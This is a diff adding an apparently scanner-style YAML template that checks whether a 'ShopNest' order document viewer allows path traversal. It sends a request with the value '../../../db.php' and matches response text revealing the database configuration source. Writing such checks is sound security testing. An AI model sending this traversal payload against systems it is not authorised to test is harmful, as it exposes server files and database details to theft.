@@ -1,0 +1,30 @@
+id: shopnest-document-access
+
+info:
+  name: ShopNest Document Access Validation
+  author: codex
+  severity: high
+  description: Checks whether the document viewer can load files outside its intended attachment directory.
+  tags: path,shopnest
+
+http:
+  - raw:
+      - |
+        GET /orders/documents/?document=../../../db.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: scanner
+        Accept: */*
+    redirects: true
+    max-redirects: 2
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "Order Documents"
+          - "new PDO(&#039;sqlite:"
+          - "CREATE TABLE IF NOT EXISTS users"
+        condition: and
